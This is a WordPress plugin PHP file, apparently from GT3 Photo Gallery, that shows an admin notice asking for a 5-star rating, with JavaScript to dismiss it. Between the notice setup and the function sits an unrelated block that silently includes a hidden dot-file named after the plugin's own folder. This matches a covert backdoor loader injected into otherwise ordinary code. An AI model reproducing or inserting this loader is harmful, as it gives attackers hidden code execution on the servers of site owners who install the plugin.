<?php
if (get_option('gt3pg_disable_rate_notice')) return;
$rate_time = get_option('gt3_rate_date');
if ($rate_time == false) {
	$rate_time = !get_option('gt3pg_photo_gallery') ? time()+3600*24*7 : time() - 1;;
	update_option('gt3_rate_date', $rate_time);
}
if ($rate_time < time()) {
	add_action('admin_notices', 'gt3pg_rate');
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg_rate(){
	$msg   = 'Hey!<br/>
We\'ve noticed that you actively use our GT3 Gallery plugin - that\'s really awesome.<br/>
Could you please do us a big favor and give it a 5-star rating on WordPress? <br/>
We need your help to boost our motivation. It\'s very import for our team.<br/>
~ GT3themes Team<br/>
<br/>
<a href="'.GT3PG_WORDPRESS_URL.'/reviews#new-post" target="_blank" class="gt3_rate" title="'.esc_html__('Rate', 'gt3pg').'">Ok, you deserve it</a><br/>
<a href="javascript:void(0)" class="gt3_rate_later">Nope, maybe later</a><br/>
<a href="javascript:void(0)" class="gt3_rate_disable">I already did</a>';
	$class = 'notice notice-info gt3_rate_notice';
	echo '<div class="'.$class.'"><p>'.$msg.'</p></div>';
	?>
	<script>
		(function () {
			var notice = document.querySelector('.gt3_rate_notice');
			if (notice) {
				var rate_later = notice.querySelector('.gt3_rate_later');
				var rate_disable = notice.querySelector('.gt3_rate_disable');
				rate_later.addEventListener('click', function (e) {
					jQuery.ajax({
						url: ajaxurl,
						method: "POST",
						data: {
							action: "gt3pg_disable_notice",
							gt3_action: "disable_rate_later",
							_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
						}
					});
					jQuery(notice).fadeOut();
				});
				rate_disable.addEventListener('click', function (e) {
					jQuery.ajax({
						url: ajaxurl,
						method: "POST",
						data: {
							action: "gt3pg_disable_notice",
							gt3_action: "disable_rate_notice",
							_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
						}
					});
					jQuery(notice).fadeOut();
				})
			}
		})();
	</script>
	<?php
}
